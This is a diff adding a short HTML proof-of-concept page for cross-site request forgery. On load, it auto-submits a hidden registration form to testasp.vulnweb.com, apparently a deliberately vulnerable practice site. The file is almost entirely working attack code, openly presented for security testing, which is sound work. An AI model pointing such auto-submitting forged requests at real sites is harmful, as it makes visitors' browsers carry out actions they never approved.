@@ -1,0 +1,24 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>This form will automatically submit when the page loads:</p>
+    <form id="csrf-form" action="http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F" method="post">
+        <input type="hidden" name="tfUName" value="">
+        <input type="hidden" name="tfRName" value="">
+        <input type="hidden" name="tfEmail" value="">
+        <input type="hidden" name="tfUPass" value="">
+
+    </form>
+    <script>
+        // Auto-submit the form when the page loads
+        window.onload = function() {
+            document.getElementById("csrf-form").submit();
+        }
+    </script>
+</body>
+</html>
